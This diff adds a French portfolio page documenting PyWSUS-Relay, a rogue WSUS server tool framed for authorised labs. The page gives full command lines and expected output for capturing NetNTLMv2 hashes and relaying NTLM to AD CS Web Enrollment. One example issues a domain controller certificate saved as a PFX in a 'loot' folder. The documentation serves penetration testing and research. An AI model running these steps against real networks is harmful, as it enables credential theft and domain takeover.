@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PyWSUS-Relay - Présentation technique</title>
+  <meta name="description"
+    content="Présentation technique de PyWSUS-Relay, serveur WSUS-over-HTTP contrôlé avec capture NTLM, relais HTTP et validation/émission AD CS Web Enrollment en lab autorisé.">
+  <link rel="canonical" href="https://abdelaaziz0.github.io/projects/pywsus-relay.html">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="/assets/img/favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="/assets/img/apple-touch-icon.png">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://abdelaaziz0.github.io/projects/pywsus-relay.html">
+  <meta property="og:title" content="PyWSUS-Relay - Présentation technique">
+  <meta property="og:description"
+    content="Serveur rogue WSUS-over-HTTP avec capture NTLM, relais HTTP et validation/émission AD CS Web Enrollment pour environnements de lab autorisés.">
+  <meta property="og:image" content="https://abdelaaziz0.github.io/assets/img/og-card.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:alt" content="Abdelaaziz Belkhair - Pentest Web et Active Directory">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="PyWSUS-Relay - Présentation technique">
+  <meta name="twitter:description"
+    content="Serveur rogue WSUS-over-HTTP avec capture NTLM, relais HTTP et validation/émission AD CS Web Enrollment pour environnements de lab autorisés.">
+  <meta name="twitter:image" content="https://abdelaaziz0.github.io/assets/img/og-card.jpg">
+  <meta name="twitter:image:alt" content="Abdelaaziz Belkhair - Pentest Web et Active Directory">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+    integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer">
+  <link rel="stylesheet" href="../assets/css/writeup.css">
+  <script src="../assets/js/theme.js"></script>
+</head>
+
+<body>
+  <header>
+    <nav>
+      <a href="../index.html" class="logo" aria-label="Accueil Abdelaaziz Belkhair"><img
+          src="../assets/img/anubis-mark.webp" alt="Logo Anubis Abdelaaziz Belkhair"></a>
+      <button class="theme-toggle" type="button" aria-label="Activer le mode clair">
+        <svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2M12 20v2M2 12h2M20 12h2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M19.1 4.9l-1.4 1.4M6.3 17.7l-1.4 1.4"></path></svg>
+        <svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M21 12.8A8.5 8.5 0 1 1 11.2 3a6.5 6.5 0 0 0 9.8 9.8z"></path></svg>
+      </button>
+      <ul class="nav-links">
+        <li><a href="../index.html#about">Profil</a></li>
+        <li><a href="../projects.html" class="active">Travail</a></li>
+        <li><a href="../writeups.html">Writeups</a></li>
+        <li><a href="../blog.html">Articles</a></li>
+        <li><a href="../index.html#experience">Expérience</a></li>
+        <li><a href="../index.html#contact">Contact</a></li>
+        <li><a href="../cv.pdf" download>CV</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main class="container">
+    <a href="../projects.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux projets</a>
+
+    <article>
+      <section class="challenge-card">
+        <span class="challenge-platform"><i class="fas fa-satellite-dish"></i> Projet WSUS et AD CS</span>
+        <h1 class="challenge-title">PyWSUS-Relay</h1>
+        <p class="challenge-subtitle">
+          Fork de PyWSUS orienté lab Active Directory : serveur rogue WSUS-over-HTTP qui maintient le dialogue avec
+          Windows Update Agent, sert des métadonnées WSUS contrôlées et ajoute capture NTLM, relais HTTP, validation
+          AD CS <code>/certsrv/</code> et émission de certificats via Web Enrollment.
+        </p>
+        <div class="challenge-meta">
+          <span class="meta-badge category">Python</span>
+          <span class="meta-badge tag">WSUS</span>
+          <span class="meta-badge tag">WUA</span>
+          <span class="meta-badge tag">NTLM</span>
+          <span class="meta-badge tag">HTTP Relay</span>
+          <span class="meta-badge tag">AD CS</span>
+          <span class="meta-badge tag">Web Enrollment</span>
+          <a class="meta-badge tag" href="https://github.com/abdelaaziz0/pyWSUS-relay" target="_blank" rel="noopener"
+            aria-label="GitHub PyWSUS-Relay"><i class="fab fa-github"></i></a>
+        </div>
+        <div class="challenge-stats">
+          <div class="stat-item">
+            <span class="stat-value">8530</span>
+            <span class="stat-label">Port WSUS HTTP</span>
+          </div>
+          <div class="stat-item">
+            <span class="stat-value">4</span>
+            <span class="stat-label">Modes NTLM</span>
+          </div>
+          <div class="stat-item">
+            <span class="stat-value">AD CS</span>
+            <span class="stat-label">Validation et issue</span>
+          </div>
+          <div class="stat-item">
+            <span class="stat-value">JSONL</span>
+            <span class="stat-label">Événements</span>
+          </div>
+        </div>
+      </section>
+
+      <nav class="toc" aria-label="Table des matières">
+        <div class="toc-title">Sommaire</div>
+        <ol>
+          <li><a href="#objectif">Objectif</a></li>
+          <li><a href="#installation">Installation</a></li>
+          <li><a href="#modes">Modes d'exécution</a></li>
+          <li><a href="#options">Options utiles</a></li>
+          <li><a href="#signaux">Signaux attendus</a></li>
+          <li><a href="#etat">État généré</a></li>
+          <li><a href="#credits">Crédits</a></li>
+        </ol>
+      </nav>
+
+      <div class="article-content">
+        <div class="info-box">
+          <strong>Note publique</strong> : cette page présente un outil de recherche et de lab. Les exemples supposent
+          un environnement isolé et autorisé, avec des cibles de test et un payload PE signé Microsoft.
+        </div>
+
+        <h2 id="objectif">1. Objectif</h2>
+        <p>
+          PyWSUS-Relay part du comportement WSUS-over-HTTP : garder Windows Update Agent en conversation avec un serveur
+          WSUS contrôlé, tout en servant des métadonnées cohérentes et un payload signé Microsoft. Ce fork ajoute une
+          couche d'observation et de relais NTLM pour tester des chemins d'attaque en Active Directory et AD CS sans
+          mélanger l'expérimentation avec une infrastructure de production.
+        </p>
+
+        <p>
+          Les ajouts principaux couvrent la capture NetNTLMv2, un relais HTTP minimal, une action de validation AD CS
+          Web Enrollment sur <code>/certsrv/</code>, puis une action d'émission qui soumet un CSR et sauvegarde le PFX
+          obtenu dans un dossier de loot.
+        </p>
+
+        <h2 id="installation">2. Installation</h2>
+        <p>
+          Le projet s'installe dans un environnement virtuel Python classique :
+        </p>
+
+        <pre><code>python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt</code></pre>
+
+        <p>
+          Le payload attendu est un exécutable PE signé Microsoft, par exemple <code>PsExec64.exe</code>.
+        </p>
+
+        <h2 id="modes">3. Modes d'exécution</h2>
+        <p>
+          Mode WSUS normal, sans capture ni relais NTLM :
+        </p>
+
+        <pre><code>python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' -v</code></pre>
+
+        <p>
+          Capture NTLM avec sortie NetNTLMv2 et journal JSONL :
+        </p>
+
+        <pre><code>python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
+  --ntlm-mode capture \
+  --hash-file netntlm-captures.txt \
+  --json-events wsus-events.jsonl \
+  -v</code></pre>
+
+        <p>
+          Relais HTTP basique vers une ressource protégée :
+        </p>
+
+        <pre><code>python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
+  --ntlm-mode relay-http \
+  --relay-target http://target.lab.local/protected/ \
+  --relay-action auth-only \
+  -v</code></pre>
+
+        <p>
+          Validation AD CS Web Enrollment sur <code>/certsrv/</code> :
+        </p>
+
+        <pre><code>python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
+  --ntlm-mode relay-http \
+  --relay-target http://ca.lab.local/certsrv/ \
+  --relay-action adcs-certsrv \
+  --relay-adcs-marker PYWSUS-LAB-ADCS \
+  --json-events relay-adcs.jsonl \
+  -v</code></pre>
+
+        <p>
+          Émission de certificat AD CS avec sauvegarde du PFX :
+        </p>
+
+        <pre><code>python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
+  --ntlm-mode relay-http \
+  --relay-target http://ca.lab.local/certsrv/ \
+  --relay-action adcs-issue \
+  --adcs-template Machine \
+  --adcs-loot-dir loot \
+  -v</code></pre>
+
+        <p>
+          Exemple pour un certificat de contrôleur de domaine dans un lab :
+        </p>
+
+        <pre><code>python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
+  --ntlm-mode relay-http \
+  --relay-target http://192.168.56.102/certsrv/ \
+  --relay-action adcs-issue \
+  --adcs-template DomainController \
+  --adcs-loot-dir loot \
+  --json-events issue-adcs-dc.jsonl \
+  -v</code></pre>
+
+        <p>
+          Un signal de réussite typique ressemble à ceci :
+        </p>
+
+        <pre><code>HTTP relay result  identity=DOMAIN\DC02$ ... authenticated=True validation=type3-and-followup followup=accepted service=adcs-web-enrollment service_validated=True adcs_issued=True cert_id=7 pfx=loot/DOMAIN_DC02.pfx</code></pre>
+
+        <h2 id="options">4. Options utiles</h2>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Option</th>
+                <th>Usage</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>--ntlm-mode</code></td>
+                <td>Choisit le comportement NTLM : <code>off</code>, <code>challenge-only</code>,
+                  <code>capture</code> ou <code>relay-http</code>.</td>
+              </tr>
+              <tr>
+                <td><code>--relay-target</code></td>
+                <td>Définit l'URL HTTP cible pour le relais.</td>
+              </tr>
+              <tr>
+                <td><code>--relay-action</code></td>
+                <td>Sélectionne l'action : <code>auth-only</code>, <code>adcs-certsrv</code> ou
+                  <code>adcs-issue</code>.</td>
+              </tr>
+              <tr>
+                <td><code>--adcs-template</code></td>
+                <td>Nom du template à demander lors de l'émission AD CS.</td>
+              </tr>
+              <tr>
+                <td><code>--adcs-alt-name</code></td>
+                <td>UPN/SAN optionnel pour la demande de certificat.</td>
+              </tr>
+              <tr>
+                <td><code>--adcs-loot-dir</code></td>
+                <td>Dossier de sauvegarde des artefacts PFX.</td>
+              </tr>
+              <tr>
+                <td><code>--ntlm-session-key</code></td>
+                <td>Suivi de session par <code>ip</code> ou par <code>connection</code>.</td>
+              </tr>
+              <tr>
+                <td><code>--hash-file</code> / <code>--json-events</code> / <code>--log-file</code></td>
+                <td>Sorties de capture, événements JSONL et logs texte.</td>
+              </tr>
+              <tr>
+                <td><code>-r HOURS</code></td>
+                <td>Rotation périodique de session.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>
+          Deux touches interactives sont exposées pendant l'exécution : <code>q</code> pour quitter et <code>r</code>
+          pour forcer une rotation de session.
+        </p>
+
+        <h2 id="signaux">5. Signaux attendus</h2>
+        <p>
+          En capture, l'objectif est de voir arriver un Type 3 NTLM, l'identité machine et l'écriture NetNTLMv2 :
+        </p>
+
+        <pre><code>NTLM Type 3 authenticate received ... identity=DOMAIN\HOST$
+HashCapture NetNTLMv2 DOMAIN\HOST$ -&gt; netntlm-captures.txt
+GetConfig</code></pre>
+
+        <p>
+          Pour la validation AD CS, le résultat attendu confirme l'authentification, le follow-up accepté et la
+          validation du service Web Enrollment :
+        </p>
+
+        <pre><code>HTTP relay result ... authenticated=True validation=type3-and-followup followup=accepted service=adcs-web-enrollment service_validated=True</code></pre>
+
+        <p>
+          Pour l'émission, la ligne importante ajoute l'identifiant du certificat et le chemin du PFX sauvegardé :
+        </p>
+
+        <pre><code>HTTP relay result ... adcs_issued=True cert_id=42 pfx=loot/DOMAIN_HOST_.pfx</code></pre>
+
+        <h2 id="etat">6. État généré</h2>
+        <p>
+          Le mode par défaut suit les sessions NTLM par IP, adapté aux tests WUA mono-client. Le mode
+          <code>connection</code> est plus strict car il tient compte du couple IP et port source. Les artefacts générés
+          peuvent inclure <code>data/known_clients.json</code>, <code>netntlm-captures.txt</code>, des journaux JSONL
+          optionnels et des PFX dans le dossier de loot.
+        </p>
+
+        <p>
+          Le format NetNTLMv2 écrit est <code>user::domain:challenge:nt_proof:client_blob</code>. L'action
+          <code>adcs-certsrv</code> sonde <code>/certsrv/certrqxt.asp</code>, tandis que <code>adcs-issue</code>
+          soumet un CSR puis sauvegarde un PFX. Les résultats JSON de relais peuvent inclure les cookies de la cible et
+          des chemins vers le HTML de debug AD CS quand l'émission échoue.
+        </p>
+
+        <h2 id="credits">7. Crédits</h2>
+        <p>
+          PyWSUS-Relay est un fork basé sur les recherches et l'outillage PyWSUS originaux de GoSecure, avec les travaux
+          antérieurs de Paul Stone et Alex Chapman sur les proxy PoC. La série de billets GoSecure sur les attaques WSUS
+          et la documentation MS-WUSP donnent le contexte protocolaire.
+        </p>
+
+        <p>
+          Code source :
+          <a href="https://github.com/abdelaaziz0/pyWSUS-relay" target="_blank" rel="noopener">abdelaaziz0/pyWSUS-relay</a>.
+        </p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <p>&copy; 2026 Abdelaaziz Belkhair</p>
+  </footer>
+</body>
+
+</html>
